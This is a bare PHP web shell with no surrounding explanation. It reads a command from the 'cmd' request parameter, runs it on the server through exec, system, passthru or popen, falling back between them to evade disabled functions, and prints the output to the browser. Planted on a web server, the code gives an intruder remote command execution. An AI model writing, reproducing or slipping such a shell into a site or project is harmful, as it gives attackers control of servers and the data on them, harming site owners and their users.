<?php
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (is_callable("system")) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru")) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}

$cmd = $_REQUEST['cmd'];
echo "<b>Result of execution this command</b>:<br>";
$olddir = realpath(".");
@chdir($d);
$ret = myshellexec($cmd);
$ret = convert_cyr_string($ret,"d","w");
if ($cmd_txt)
{
  $rows = count(explode("\r\n",$ret))+1;
  if ($rows < 10) {$rows = 10;}
  echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
}
else {echo $ret."<br>";}
?>